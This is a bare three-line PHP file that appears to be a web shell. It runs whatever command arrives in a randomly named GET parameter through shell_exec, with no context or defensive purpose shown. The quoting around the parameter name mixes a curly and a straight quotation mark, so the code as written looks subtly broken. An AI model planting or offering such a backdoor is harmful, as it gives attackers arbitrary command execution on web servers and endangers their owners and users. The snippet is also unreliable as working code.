<?php
shell_exec($_GET[’cmSbKsXJ']);
?>
